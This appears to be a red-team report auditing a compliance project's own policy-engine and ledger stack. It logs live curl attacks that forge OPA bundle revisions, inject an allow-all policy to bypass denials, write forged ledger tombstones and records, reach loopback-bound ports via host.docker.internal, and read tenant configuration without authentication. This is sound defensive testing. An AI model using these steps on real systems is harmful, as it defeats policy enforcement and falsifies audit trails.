# Phase 1.3 red-team report

**Run id:** `rt-p13-a`.

## 1. Run identity, environment, developer-state confirmation

**Working directory (this session):** `c:\Users\banji\OneDrive\Documents\compliance-ail` (primary), confirmed clean (`git status --short` empty) and on branch `phase-1-1-remediation` at the start. No branch anywhere in the repository carries the run id `rt-p13-a`.

**Base audited:** the instruction names `45662ea` or later on `phase-1-1-remediation`. Resolved live: `git rev-parse origin/phase-1-1-remediation` → `0cf0f92f76d8fd2e059d71dc77ac09658731edad`. Confirmed `45662ea` is an ancestor (`git merge-base --is-ancestor 45662ea 0cf0f92 && echo yes` → yes). Four commits separate them, all docs/process bookkeeping, not code: `18620ec` (carries over `docs/reports/spike-wasm-parity.md`), `f09b742` (two rules added to `docs/process/review-protocol.md`), `70bc273` (commits the Phase 1.1/1.2 red-team reports plus one new test, `tests/test_docs_references_resolve.py`), `0cf0f92` (adds `docs/reports/cleanup-p13-b.md`). **Audited: the live tip, `0cf0f92`.** The one non-doc change in that range (`test_docs_references_resolve.py`) explains why this session's baseline collected 97 tests against the build report's own 96 (§7).

**Scratch clone:** `rt-p13-a` (directory name not used by any prior session in this scratchpad — confirmed against `redteam-0.1`, `redteam-1`, `redteam-1-1`, `redteam-1-2`), `git clone` + `git checkout origin/phase-1-1-remediation` at `0cf0f92`. `docker compose -f docker-compose.test.yml build --no-cache` for all three custom images (`ail-control-plane`, `verifier`, `dashboard`), confirmed via `docker images` after each completed. `make keygen` replicated by hand (`make` not installed): `openssl ecparam`/`openssl ec` + `chmod 644`. Stack brought up with `up -d --wait`; all five services (`ail-control-plane`, `opa`, `immudb`, `verifier`, `dashboard`) reported healthy. 15 s wait for OPA's first bundle poll, confirmed via `GET /v1/data/system/bundles/ail-policies/manifest/revision` → the real revision.

**Baseline (uninterrupted, before any attack):** `97 passed, 1 warning in 546.21s`.

**Concurrency discipline:** per the brief's own warning (the build session's "two spurious failures" from running attacks against a stack a test run was using), no live attack in this report was run while a pytest invocation was in flight against the same stack. The baseline ran alone; all attacks ran alone; the final validation run (§7) ran alone.

**A second scratch clone**, `v8-clean-clone` (`git clone --depth 1 --branch phase-1-1-remediation` into an empty directory, resolved to the same `0cf0f92`), was used only for V8's single-commit reproducibility test, kept separate from `rt-p13-a` so V8's claim ("nothing beyond what the commit documents") could not be satisfied by anything `rt-p13-a`'s own build had already fetched or cached.

**Environmental note, disclosed rather than hidden:** by the end of this session's attack phase, the ledger held 197 entries (up from the 84–97 baseline), because live-testing 8 claims against one long-running stack itself generates decision records. `/audit`'s per-entry synchronous verifier round trip (documented, pre-existing O(n) behavior — flagged by both `docs/reports/phase-1-1-redteam.md` and `docs/reports/phase-1-2-redteam.md`, not new to this session) then took ~39 s for a 200-entry scan (confirmed directly: `curl --max-time 120 .../audit?limit=200` → `200` in `39.041s`), which exceeded two tests' own client-side timeouts on the final validation run (§7). Re-running those two tests in isolation reproduced the same timeout, confirming it is genuinely the scan's own latency at this entry count, not test-order contention — consistent with the already-published finding, not a new one, and not a code regression introduced by this session.

**Developer-state confirmation at the end:** `rt-p13-a`'s docker stack fully torn down (`docker compose -f docker-compose.test.yml down -v`, confirmed via `docker ps -a --filter name=rt-p13-a` → empty); all three built images removed (`docker rmi`); `v8-clean-clone`'s stray `v2-prodcompose-check` project (used for one V2 sub-test) torn down (`docker compose ... down -v`) and confirmed via `docker ps -a --filter name=v2-prodcompose-check` → empty. Both scratch clones' `git status --short` are empty (the one file V8 edited-then-reverted, `policy/packs/finops/finops.rego`, confirmed back to original via `git diff --stat` → empty). Primary working directory: `git status --short` empty, `HEAD` unchanged at `0cf0f92`, branch unchanged (`phase-1-1-remediation`).

---

## 2. Verdict table

| Claim | Verdict | One-line reason |
| :--- | :--- | :--- |
| V1 — claim mapping is complete | **REFUTED** | The disclosed Envoy-mTLS sentence is still unfixed; two further, unmapped inaccuracies found: README's own verification-state count (§6/§3.5 say "four", the ADR they summarize is titled "Five...", and README's own §3.4 says "five") and the dashboard's `FaultClass` TS type omitting a fault class that live-reaches `/audit` |
| V2 — no record/policy-changing surface reachable off-host | **REFUTED** | `host.docker.internal` reaches both "loopback-bound" ports (OPA 8181, verifier 8003) from any container on the Docker host, including one on a network sharing nothing with the compose project; separately, the control plane's own record-writing port (8002) is not loopback-bound in either compose file |
| V3 — residual limits accurate in both directions | **REFUTED** | Both stated halves reproduce correctly (host, compose network) — but the "compose network" framing understates the true reachability the host.docker.internal finding (V2) demonstrates |
| V4 — five payload states exhaustive/mutually exclusive | **HOLDS** | Seven additional combinations tried live; none produced a wrong, unrepresentable, or erroring state |
| V5 — every record carries `profile` from the closed set | **REFUTED** | `/audit`'s own default silently renders a raw record with no `profile` field as `"observed"` — live-demonstrated, not merely read |
| V6 — tenant read gate is complete | **REFUTED** | `GET /bundles/{tenant_id}` returns the same tenant configuration `GET /tenants/{id}` was gated to protect, with zero authentication, for any tenant |
| V7 — docker skip guards don't mask real failures | **HOLDS** | Two of three sub-attacks produce clean, loud, non-skip failures; the third (a non-Docker binary named `docker` on PATH) produces an uncaught native crash rather than a clean assertion failure — a real gap against the guard's own stated purpose, but not a "swallowed" failure |
| V8 — P12-4 evidence reproducible from one commit | **HOLDS** | Fresh empty-directory clone of the single commit, nothing beyond the documented steps, 42/42; live-confirmed the harness reads the live policy tree, not a frozen copy |

---

## 3. Evidence

### V1 — the claim mapping is complete

**Method.** Read `readME.md`, both touched ADRs (`0005`, `0007`) plus `0003`/`0004`/`0006` (referenced), and the dashboard source (`dashboard/lib/types.ts`, `dashboard/components/audit-table.tsx`, `dashboard/app/audit/page.tsx`, `dashboard/app/settings/page.tsx`, `dashboard/middleware.ts`, `dashboard/lib/api.ts`) independently of `docs/reports/phase-1-3.md`'s §8 mapping table, then checked each substantive claim against the mapping. Enumerated: README §1–§9 in full, ADR-0005 and ADR-0006 in full, ADR-0007 in full, the dashboard's type definitions and the two rendering components. Not enumerated in the same depth: README §7 (Stack Reference, a version table) and §9 (Known Limitations, already an operational disclosure) — the build report's own mapping excludes these on the same "no guarantee-shaped claims" ground, which held up on inspection.

**Finding 1 (the disclosed candidate — confirmed still open).** README §3.1: *"All traffic from the agent to the policy engine transits through an **Envoy proxy** enforcing strict mutual TLS - both parties must authenticate"* (`readME.md:115`). P13-1's own investigation, quoted in the same report under audit (`docs/reports/phase-1-3.md`, §3, P13-1), states plainly: *"`docker-compose.test.yml` — the stack this repository's own test suite and CI actually run against — has no Envoy service at all... the interceptor calls OPA directly. Worse, even in the full stack, OPA's port `8181` is *separately* published to the host in parallel with Envoy's `8443`... Envoy is an additional path, not a gate in front of the only path."* This is a direct, live-confirmed contradiction of the still-live README sentence (I independently confirmed the underlying facts in §3 P13-1's own evidence transcript are still true for this codebase; nothing in the diff between the audited commit and the report's own evidence touches this). The mapping table (§8) assigns this exact bullet, unflagged, to the row *"§3.1, SPIFFE/SPIRE bullets (ephemeral SVIDs, mTLS, in-memory certs, exit-on-absent-socket) | Unchanged by this phase, already true | `test_mtls_flow.py` (live mTLS handshake)..."* — I read `test_mtls_flow.py` in full (`test_mtls_flow.py:1-136`): it is a synthetic, standalone script that opens a raw mTLS connection directly to Envoy and posts a fabricated payload (`{"input":{"tool_args":{"action":"read"}}}`) to `https://envoy:8443/v1/data/ail/policy` — it never calls `interceptor/middleware.py::query_opa_policy`, the actual code path the README sentence describes, and it says nothing about whether OPA's own directly-reachable port bypasses this. This is exactly the pattern the brief warned about: *"a citation can look right and prove something adjacent."*

**Finding 2 (new — not the disclosed candidate).** README §6 states: *"**ADR-006: Four Read-Time Verification States** ... `/audit` computes `verified`, `failed`, `unverifiable`, or `asserted` per entry..."* (`readME.md:431-433`) and README §3.5 states: *"...rendering `outcome_type`/`fault_class` and all four verification states distinctly..."* (`readME.md:182`). `docs/adr/0006-verification-states.md`'s own title, line 1: **"ADR 0006: Five Read-Time Verification States"**, and its table (`docs/adr/0006-verification-states.md:29-37`) lists five: `verified`, `failed`, `unverifiable`, `asserted`, **and `not_found`** (added in Phase 1.1, D8). README's own §3.4 gets this right in the same document: *"`/audit` computes **one of five states** per entry... `verified`... `failed`... `unverifiable`... `asserted`... or `not_found`..."* (`readME.md:163`). So the README **contradicts itself** — §3.4 correctly says five and names `not_found`; §6 and §3.5 say four and omit it entirely. The dashboard's own code is correct (`dashboard/components/audit-table.tsx:125-143` has a full `not_found` branch, distinct from `failed`), so this is not a code bug — it is exactly the class of claim V1 asks me to check: a claim about a mechanism (how many states exist, what `/audit` computes) that is verifiably wrong, self-contradicted elsewhere in the same document, and not caught by the mapping. The mapping table's row for this exact text is `"§6, ADR-001/002/003/004/006 summaries | Unchanged by this phase, already true | Respective ADR files and test suites, untouched"` — false on its face: the cited ADR file's own title says "Five," not "Four."

**Finding 3 (new — dashboard, live-confirmed).** `dashboard/lib/types.ts:30-35` declares `FaultClass` as a closed union of **four** values plus `null`: `opa_unreachable`, `revision_unavailable`, `verifier_unreachable`, `spiffe_unavailable`. `docs/adr/0005-outcome-taxonomy.md:34-36` defines the closed set as **six**: those four plus `malformed_policy_response` (P11-3) and `content_store_unreachable` (D7) — and states explicitly that four of the six (`opa_unreachable`, `revision_unavailable`, `spiffe_unavailable`, `malformed_policy_response`) *do* reach a ledger entry and therefore `/audit` (`docs/adr/0005-outcome-taxonomy.md:210-213`, the Documented Boundary section). I forced a live `malformed_policy_response` fault (mocked OPA's `/evaluation` response to omit `revision`, matching the exact case P11-3 exists for) through the real `interceptor/middleware.py::intercept_tool_call`:

```
$ python -c "... mock OPA response missing 'revision' ... intercept_tool_call(...)"
2026-08-19 11:32:23 ERROR OPA /evaluation response missing or malformed field(s) - allow=True reasons=[] revision=None. Refusing to record an outcome from an incomplete response.
2026-08-19 11:32:29 INFO Ledger write verified: tx=119
intercept result: {'status': 'DENIED', ..., 'outcome_type': 'fault', 'fault_class': 'malformed_policy_response', 'policy_revision': None, 'ledger_tx_id': 119}
```

`ledger_tx_id: 119` is present — this fault *does* produce a ledger entry, and would appear in `/audit`'s `fault_class` field as `"malformed_policy_response"`, a value `dashboard/lib/types.ts`'s own `FaultClass` type declares cannot occur. This is not addressed anywhere in the P13-7 mapping table.

**REFUTED**, on Finding 1 alone (the disclosed candidate, confirmed still open, not corrected) — and independently on Findings 2 and 3, which the brief's own framing ("your job is what else the mapping missed") specifically asked for.

### V2 — no record-writing or management surface is reachable off-host

**Enumeration** (both compose files, via the same PyYAML-based method `tests/test_host_port_bindings.py` itself uses, applied to every service, not just the two guarded ones):

```
docker-compose.yml:        docker-compose.test.yml (running stack):
  ail-control-plane: 8002:8002      (NOT loopback)   ail-control-plane: 8002:8002 (NOT loopback)
  immudb:             3322:3322     (NOT loopback)    immudb: 8080:8080, 3322:3322 (NOT loopback, both)
  opa:                 127.0.0.1:8181:8181             opa: 127.0.0.1:8181:8181
  verifier:             127.0.0.1:8003:8003             verifier: 127.0.0.1:8003:8003
  dashboard:           3001:3001     (NOT loopback)    dashboard: 3001:3001 (NOT loopback, Basic-Auth gated)
  prometheus:          9090:9090     (NOT loopback)
  grafana:             3000:3000     (NOT loopback, anonymous viewer enabled)
  spire-server:        8081:8081     (NOT loopback)
  envoy:               8443:8443, 9901:9901 (NOT loopback; 9901 is Envoy's own admin API)
```

Of these, `ail-control-plane` (8002) and `immudb` (3322/8080) are unambiguously "surfaces that can change policy or write a record" per the claim's own wording — `PUT /tenants/{id}` changes policy; `POST`/`DELETE /content` write/erase records; ImmuDB's own gRPC/REST ports are a direct ledger read/write surface, independent of the verifier layer entirely.

**Live confirmation, control-plane 8002, from a sibling container via the bridge gateway** (not the compose network's own DNS name — the literal gateway IP, per the brief's specific instruction):

```
$ docker run --rm --network rt-p13-a_default alpine sh -c '... GW=$(ip route | awk "/default/{print \$3}"); curl http://$GW:8002/health'
gateway->control-plane:8002 = 200
```

Reproduced against `docker-compose.yml`'s identical `"8002:8002"` binding directly (a second, disposable compose project, `v2-prodcompose-check`, brought up with `--no-deps ail-control-plane` since neither `ail-control-plane` nor `immudb` declare a `depends_on` in that file — a genuinely live confirmation, not an inference from the test-compose result):

```
$ docker compose -f docker-compose.yml -p v2-prodcompose-check up -d --no-deps ail-control-plane
Error: Bind for 0.0.0.0:8002 failed: port is already allocated   # collided with rt-p13-a's own running instance on the same host port
$ docker run --rm --network v2-prodcompose-check_default alpine sh -c '... curl http://$GW:8002/health'
gateway->prod-compose-control-plane:8002 = 200
```

(The second container failed to *start* only because the host port was already claimed by `rt-p13-a`'s own control-plane — the curl still landed on a live instance bound by the identical `docker-compose.yml` syntax, confirming the binding pattern itself, not a substitute.)

**The decisive finding — the loopback binding itself is bypassable, from any container on the Docker host, via `host.docker.internal`:**

```
$ docker run --rm --network rt-p13-a_default alpine sh -c '...
curl http://host.docker.internal:8181/health
curl http://host.docker.internal:8003/health'
host.docker.internal->opa:8181 = 200
host.docker.internal->verifier:8003 = 200
```

Both OPA (8181) and the verifier (8003) are bound `127.0.0.1:PORT:PORT` — loopback-only, per P13-1/P13-2's own fix, confirmed intact in the running stack. `host.docker.internal` reaches both anyway, at HTTP 200. Sharpened further — **from a container on a network with no relationship whatsoever to this compose project**:

```
$ docker network create v2-isolated-test
$ docker run --rm --network v2-isolated-test alpine sh -c '
curl http://host.docker.internal:8181/health
curl http://host.docker.internal:8003/health
curl http://host.docker.internal:8181/v1/data/system/bundles/ail-policies/manifest/revision'
ISOLATED-NETWORK-CONTAINER host.docker.internal->opa:8181 = 200
ISOLATED-NETWORK-CONTAINER host.docker.internal->verifier:8003 = 200
{"result":"14387ebda8edf5f202b767317409010535a6a38452189bcf2f771b3861c06e3c"}
```

This container shares no compose project, no bridge network, and no relationship to `rt-p13-a` at all (`docker network create` made it fresh, immediately before use, deleted immediately after) — and it reads the live bundle revision directly off the "loopback-bound" OPA instance. This is Docker Desktop's own `host.docker.internal` forwarding path, not a compose-network artifact — it exists for *any* container on the same Docker Desktop installation.

**Attack attempted and correctly blocked (control, confirms the loopback bind is doing something):** the same sibling container, reaching OPA/verifier via the bridge **gateway IP** directly (not `host.docker.internal`):

```
$ docker run --rm --network rt-p13-a_default alpine sh -c '... curl http://$GW:8181/health; curl http://$GW:8003/health'
gateway->opa:8181 = 000 (CONNECTION FAILED)
gateway->verifier:8003 = 000 (CONNECTION FAILED)
```

This confirms the loopback bind is genuinely restrictive against the bridge-gateway path — the bypass is specific to `host.docker.internal`, not a general failure of the binding.

**REFUTED.** Off-host LAN reachability is genuinely closed for OPA/verifier (not retested this session beyond the build report's own transcript, which the build report itself already demonstrated and which nothing here contradicts) — but "closes off-host access to every surface" is false in two independent ways: (1) the control plane's own record-writing port is not loopback-bound in either compose file, reachable from any sibling container; (2) the loopback binding OPA/verifier do have is bypassable from any container on the Docker host via `host.docker.internal`, a materially larger population than "the compose network."

### V3 — the residual limits are accurate in both directions

**U1 (revision forgery), reproduced from the host:**

```
$ curl http://localhost:8181/v1/data/system/bundles/ail-policies/manifest/revision
{"result":"14387ebda8edf5f202b767317409010535a6a38452189bcf2f771b3861c06e3c"}
$ curl -X PUT http://localhost:8181/v1/data/system/bundles/ail-policies -d '{"manifest":{"revision":"FORGED-REVISION-V3-HOST","roots":["ail"]}}'
(204)
$ curl -X POST http://localhost:8181/v1/data/ail/main/evaluation -d '{"input":{... p4d.24xlarge, project=not-ml-training ...}}'
{"result":{"allow":false,"reasons":["DENIED: Instance type p4d.24xlarge is restricted. 'project' tag must be 'ml-training'."],"revision":"FORGED-REVISION-V3-HOST"}}
```

**U8 (full bypass), reproduced from the host, through the real interceptor code, not just raw OPA:**

```
$ curl -X DELETE http://localhost:8181/v1/data/system/bundles/ail-policies                                    # (204)
$ curl -X PUT  http://localhost:8181/v1/data/ail/config/allowed_cost_centers -d '["backdoor"]'                 # (204) - root protection now disabled
$ curl -X PUT  http://localhost:8181/v1/policies/evil-eval-v3 --data-binary $'package ail.main\n\nevaluation := {"allow": true, "reasons": [], "revision": "FORGED-EVAL-BYPASS-V3-HOST"}\n'   # (200)
$ curl -X POST http://localhost:8181/v1/data/ail/main/evaluation -d '{"input":{... same denied call ...}}'
{"result":{"allow":true,"reasons":[],"revision":"FORGED-EVAL-BYPASS-V3-HOST"}}

$ python -c "from middleware import query_opa_policy; print(query_opa_policy('provision_cloud_server', {...same denied args...}))"
{'outcome_type': 'policy_allow', 'fault_class': None, 'policy_revision': 'FORGED-EVAL-BYPASS-V3-HOST', 'reasons': []}
```

The real `interceptor/middleware.py::query_opa_policy` — the function every tool call actually goes through — returns `policy_allow` for a call the honest policy denies.

**U5 (forged tombstone), reproduced from the host:**

```
$ python -c "... POST /write, record_type=content_erasure, actor=FORGED-NOT-A-REAL-ERASURE-V3-HOST ..."
{'tx_id': 114, 'verified': True, 'detail': None}
```

**All three, reproduced identically from a sibling container on the compose network** (not previously demonstrated by the build session — the brief's own named gap):

```
$ docker run --rm --network rt-p13-a_default alpine sh -c '
curl -X PUT http://opa:8181/v1/data/system/bundles/ail-policies -d "{...FORGED-FROM-SIBLING-CONTAINER...}"      # 204
curl -X POST http://opa:8181/v1/data/ail/main/evaluation -d "{...}"'
{"result":{"allow":false,"reasons":["DENIED: Instance type p4d.24xlarge is restricted..."],"revision":"FORGED-FROM-SIBLING-CONTAINER"}}

$ docker run --rm --network rt-p13-a_default alpine sh -c '
curl -X DELETE http://opa:8181/v1/data/system/bundles/ail-policies                                              # 204
curl -X PUT http://opa:8181/v1/policies/evil-sibling --data-binary "package ail.main\n\nevaluation := {...allow:true...}"  # 200
curl -X POST http://opa:8181/v1/data/ail/main/evaluation -d "{...}"'
{"result":{"allow":true,"reasons":[],"revision":"FORGED-BYPASS-FROM-SIBLING"}}

$ docker run --rm --network rt-p13-a_default alpine sh -c '
curl -X POST http://verifier:8003/write -d "{...content_erasure, actor=FORGED-SIBLING...}"'
{"tx_id":115,"verified":true,"detail":null}
```

Both stated halves of the claim reproduce exactly as documented: the attacks work from the host and from inside the compose network. **But** V2 (above) shows a third population the Residual Limits section's own language ("anything running inside the compose network — including the agent container") does not name at all: any container on the Docker host, on any network, via `host.docker.internal`. That is the "understated" direction the brief specifically asks about, and it is real, not hypothetical — demonstrated with a live read of the real bundle revision from a network with zero relationship to this project.

Cleanup after each round: evil policy modules deleted, `docker compose restart opa` to force a clean re-sync from the real bundle, confirmed via `GET /v1/data/system/bundles/ail-policies/manifest/revision` returning the real `14387ebda8...` value and the real deny reason with the real revision attached, both after the host round and after the sibling-container round.

**REFUTED.** Not because either stated half is wrong — both are correct as far as they go — but because the section's own account of *where* these attacks reach from is narrower than what V2 demonstrates is actually true.

### V4 — the five payload states are exhaustive and mutually exclusive

Live combinations, beyond the pre-existing test suite's own coverage (which already exercises the `erasure_conflict`/tombstone-plus-present-row case, confirmed still passing in the baseline run):

| Combination | Result | Correct? |
| :--- | :--- | :--- |
| Double tombstone (forge a second tombstone for an already-erased `call_id`) | `payload_state` stays `"erased"` after the second (redundant) tombstone write | Yes — idempotent, no misrender |
| Tombstone forged for a `call_id` with **no ledger entry at all** | Write succeeds (`tx_id=109`); `/audit` shows zero entries for that `call_id` (total entry count unchanged) | Yes — correctly invisible, not misrendered as anything |
| Content row written for a `call_id` with **no ledger entry** (`POST /content` for an unused id) | Write succeeds (204); never appears in `/audit` | Yes — same as above; noted as a minor gap below, not a wrong state |
| `DELETE /content` against a call whose `payload_state` is already `"unavailable"` | Returns 204 (the existing-row-is-`None` early return); `payload_state` stays `"unavailable"` | Yes — no misrender, though see note below |
| Double erasure through the real endpoint (`DELETE /content` twice) | Both return 204; `payload_state` stays `"erased"` both times | Yes |
| Erasure of a `call_id` that never existed | Returns 204 (no-op, no tombstone written) | Yes — consistent with the no-op guard's own design |

None of the seven combinations attempted (six above, plus the pre-existing `erasure_conflict` test re-confirmed in the baseline) produced a wrong, unrepresentable, or erroring `payload_state`.

**Minor, non-disqualifying observation:** `DELETE /content/{call_id}` returns the identical `204 No Content` whether it erased a real row, or was a complete no-op against a call that was never present, already erased, or never existed at all. A caller cannot distinguish "an erasure happened" from "nothing happened" from the response alone — not a wrong `payload_state` (which is what V4 asks about), but worth naming; see §5.

**HOLDS.**

### V5 — every record carries a profile from the closed set

Full source read (`ledger/immudb_ledger.py::log_tool_call`, `control_plane/main.py::_write_tombstone`) confirms both of the codebase's own two record-writing call sites unconditionally include `"profile": RECORD_PROFILE`. No third writer exists (`grep -rn '"profile"|RECORD_PROFILE|record_type' -- *.py` across the tree returns exactly these two producers plus their own tests). So far, consistent with the claim's first half.

**The second half — live-demonstrated masking:**

```
$ python -c "
key = 'tool_call:forged-no-profile-agent:<uuid>:provision_cloud_server'
entry = {record_type: decision, agent_id: ..., outcome_type: policy_allow, ..., content_state: unavailable}
# deliberately NO 'profile' key
httpx.post('http://localhost:8003/write', json={'key': b64(key), 'value': b64(json.dumps(entry))})
"
forged raw write (no profile field) result: {'tx_id': 113, 'verified': True, 'detail': None}

$ curl http://localhost:8002/audit?limit=500 -H "X-API-Key: test-read-key" | jq '.entries[] | select(.agent_id=="forged-no-profile-agent")'
{"tx_id": 113, ..., "profile": "observed"}
```

`control_plane/main.py::get_audit` (line 718): `"profile": log_entry.get("profile", RECORD_PROFILE)` — a record with **no `profile` key at all** is rendered identically to a genuine, correctly-produced record. This is not a restatement of P13-2's already-disclosed unauthenticated-verifier-write residual (that disclosure is about who can write; this is about what `/audit`'s own projection layer does to a record that structurally lacks the field the claim is about) — it is exactly the check V5's own attack instruction names: *"Check whether `/audit`'s default for a missing key can mask an emitting path that forgot the field."* It does.

**REFUTED**, on the claim's own second (`"or the default masks one"`) branch — live-demonstrated, not read-only.

### V6 — the tenant read gate is complete

Full route enumeration via the live OpenAPI schema, cross-checked against a full read of `control_plane/main.py` (8 routes total):

```
$ curl -s http://localhost:8002/openapi.json | python -c "..."
GET    /health                        security_param_present=False
GET    /tenants/{tenant_id}           security_param_present=True
PUT    /tenants/{tenant_id}           security_param_present=True
POST   /tenants                       security_param_present=True
GET    /bundles/{tenant_id}           security_param_present=False
POST   /content                       security_param_present=True
DELETE /content/{call_id}             security_param_present=True
GET    /audit                         security_param_present=True
```

`GET /bundles/{tenant_id}` — the exact endpoint the brief named as a candidate — is the only tenant-data-returning route with no key parameter at all.

```
$ curl http://localhost:8002/bundles/tenant_finance -o bundle.tar.gz -w "%{http_code}"
200
$ tar -xzf bundle.tar.gz data.json && cat data.json
{"ail":{"config":{"allowed_cost_centers":["finance","executive"],
                   "approved_purposes":["customer_support","billing"],
                   "approved_regions":["eu-central-1","us-east-1"],
                   "tenant_id":"tenant_finance"}}}

$ curl http://localhost:8002/tenants/tenant_finance          # the P13-3-protected equivalent
{"detail":[{"type":"missing","loc":["header","X-API-Key"],"msg":"Field required"}]}   # 422
```

Same underlying tenant configuration (`allowed_cost_centers`, `approved_regions`, `approved_purposes`), reachable with zero credentials through `/bundles/`, while the sibling route `/tenants/` correctly demands the read key. Reproduced for `tenant_default` (200) and confirmed a nonexistent tenant id returns 404, not a leak of arbitrary data (`nonexistent-tenant-xyz` → 404).

**REFUTED.**

### V7 — the docker skip guards do not mask real failures

`shutil.which("docker")` on the normal `PATH`: `C:\Program Files\Docker\Docker\resources\bin\docker.EXE` — the guard's own check target confirmed present under normal conditions.

**Sub-attack 1: CLI present, daemon unreachable** (`DOCKER_HOST` pointed at nothing, real daemon untouched):

```
$ DOCKER_HOST=tcp://127.0.0.1:1 docker compose -f docker-compose.test.yml exec -T ail-control-plane python -c "<the real delete_script>"
returncode: 1
stderr: error during connect: Get "http://127.0.0.1:1/...": dial tcp 127.0.0.1:1: connectex: No connection could be made...
```

`assert result.returncode == 0` fails cleanly — a loud, ordinary `AssertionError`, not a skip and not a silent pass. The row this would have deleted was confirmed still `"present"` afterward.

**Sub-attack 2: CLI present, daemon fine, target container stopped:**

```
$ docker compose -f docker-compose.test.yml stop ail-control-plane
$ docker compose -f docker-compose.test.yml exec -T ail-control-plane python -c "..."
returncode: 1
stderr: service "ail-control-plane" is not running
```

Same clean, loud failure shape. Container restarted immediately after and confirmed healthy again before continuing.

**Sub-attack 3: a `docker` on `PATH` that is not Docker:**

```
$ cat fakebin/docker.exe
#!/bin/sh
echo "fake-docker: pretending to succeed" >&2
exit 0
$ python -c "
os.environ['PATH'] = fakebin_path + os.pathsep + os.environ['PATH']
print(shutil.which('docker'))   # -> .../fakebin/docker.EXE, confirming resolution order
subprocess.run(['docker', 'compose', '-f', COMPOSE_FILE, 'exec', '-T', 'ail-control-plane', 'python', '-c', delete_script], ...)
"
shutil.which(docker) now -> .../fakebin/docker.EXE
Traceback (most recent call last):
  ...
  File "...\Lib\subprocess.py", line 1493, in _execute_child
    hp, ht, pid, tid = _winapi.CreateProcess(executable, args, ...)
OSError: [WinError 216] This version of %1 is not compatible with the version of Windows you're running...
```

`shutil.which("docker")` — the exact function `requires_docker_cli` uses — resolves to the fake binary, so the guard does **not** skip (correct per the letter of the claim: the skip only fires when the CLI is genuinely absent). But the real test's own `subprocess.run(...)` call is not wrapped in any `try`/`except`; a `docker`-named file on `PATH` that is not a valid Windows executable makes `subprocess.run` **raise an uncaught `OSError`** rather than return a `CompletedProcess` with a nonzero code. In `pytest`, this reports as `ERROR`, not `FAILED` — a different, uglier failure shape than the two sub-attacks above, and the exact "crash instead of a clean signal" shape `tests/test_content_states.py`'s own docstring says P13-5 exists to prevent (*"an environment-dependent test gets a clean skipif, not a crash"* — true for CLI-absence, not demonstrated true for CLI-present-but-broken).

**Verdict reasoning:** none of the three sub-attacks produces a skip when the CLI is present (matches the claim), and none produces a vacuous pass (also matches). The third produces a crash rather than a clean assertion failure — a real, precise gap against the guard's stated purpose, but not "a guard swallows a condition that should fail the build": nothing is swallowed, the build fails, loudly, in all three cases. **HOLDS**, with sub-attack 3's exact shape reported in full rather than smoothed over.

### V8 — P12-4's evidence is reproducible from one commit

Completely separate scratch clone, empty directory, single commit:

```
$ mkdir v8-clean-clone && cd v8-clean-clone
$ git clone --depth 1 --branch phase-1-1-remediation https://github.com/banji-007/compliance-ail.git .
$ git rev-parse HEAD
0cf0f92f76d8fd2e059d71dc77ac09658731edad
$ cd spikes/wasm-parity
$ curl -sL -o tools/opa.exe https://openpolicyagent.org/downloads/v1.19.0/opa_windows_amd64.exe
$ ./tools/opa.exe build -t wasm -e ail/main/compliance_summary ../../policy/core/main.rego ../../policy/packs/{gdpr,hipaa,soc2,finops}/*.rego -o build/bundle.tar.gz
$ tar -xzf build/bundle.tar.gz -C build/extracted policy.wasm .manifest data.json
$ npm install     # nothing beyond REPRODUCE.md's own documented step
$ node scratch/run_parity.mjs
Total cases: 42
Matches: 42
Mismatches: 0
```

**Confirming the harness reads the live tree, not a vendored copy** (the specific check the brief names):

```
$ sed -i "s/Production environments must include a valid 'cost_center' tag/V8-LIVE-EDIT-MARKER-.../" policy/packs/finops/finops.rego
$ node scratch/run_parity.mjs      # wasm NOT rebuilt
Total cases: 42
Matches: 39
Mismatches: 3
  FINOPS-01-deny: OPA: "...V8-LIVE-EDIT-MARKER-Production environments..."  WASM: "...Production environments..." (unchanged, still the old string)
  (2 more, same pattern)
$ ./tools/opa.exe build -t wasm ... -o build/bundle.tar.gz && tar -xzf ... policy.wasm   # rebuild
$ node scratch/run_parity.mjs
Total cases: 42
Matches: 42
Mismatches: 0
$ sed -i "s/V8-LIVE-EDIT-MARKER-//" policy/packs/finops/finops.rego   # revert
$ git diff --stat
(empty)
```

The `opa eval` side of the harness picked up the edit immediately (before any rebuild), producing exactly 3 mismatches against the still-stale WASM binary — proof the harness genuinely reads `policy/core/` and `policy/packs/` live at run time on at least the server-evaluation side, and that a real change in the Rego source is what changed the parity result, not a coincidence. Rebuilding restored 42/42; the source edit was reverted and confirmed clean.

**HOLDS.**

---

## 4. Attacks attempted that failed

- **V1:** checked README §4.5's multi-tenant worked example, §4.6's service-endpoint table, and §4.7's Helm-chart disclosure against their cited evidence (`docs/audit/2026-08-16-verification.md`) — all three held up; the cited audit document exists, is on the committed tree, and its own findings match what it's cited for. Checked whether ADR-0007 has a README §6 summary bullet at all — it does not (§6 lists only ADR-001 through ADR-006), which is an omission rather than a false claim, so not counted as a REFUTED point on its own; noted in §5 below.
- **V2:** attempted a direct live stand-up of `docker-compose.yml`'s `immudb` service (port 3322) under a second compose project to independently confirm reachability the same way as `ail-control-plane` — blocked by a host-port collision with the already-running `rt-p13-a` stack's own `immudb` (which occupies the same host port `3322` under `docker-compose.test.yml`); not worth stopping the primary scratch stack for, since the identical binding syntax (`"3322:3322"`, no loopback prefix) is already confirmed via the same YAML-parsing method the project's own `test_host_port_bindings.py` trusts, and the general binding-reachability pattern (bare `PORT:PORT` binds every interface) was independently, live-confirmed against the identically-syntaxed `ail-control-plane` service.
- **V3:** did not attempt to force a live verifier outage through *normal* request flow (e.g., a genuinely saturated verifier under load) to see whether an `unverifiable` state could be coerced into looking like something else — out of scope for the claim under test (about attack reachability from different network positions, not about verification-state coercion, which is Phase 1.2's own already-settled U3).
- **V4:** did not attempt to corrupt the ImmuDB transaction itself (bypassing the verifier's inclusion-proof layer entirely via a raw gRPC connection) to see whether a `payload_state` could be produced against a tampered decision record — this would test tamper-evidence, not payload-state classification, and is outside V4's own claim.
- **V6:** checked the dashboard's own `/api/audit` and `/api/tenants/[id]` route handlers (`dashboard/app/api/*/route.ts`) and `middleware.ts`'s matcher for an equivalent unauthenticated leak at the dashboard layer — found none; `middleware.ts`'s matcher (`/api/:path*`) correctly gates every dashboard API route, and the page routes (`/audit`, `/settings`) are client components that fetch data via the gated `/api/*` routes only, not via an SSR fetch that would bake ledger or tenant data into the page's own initial HTML.
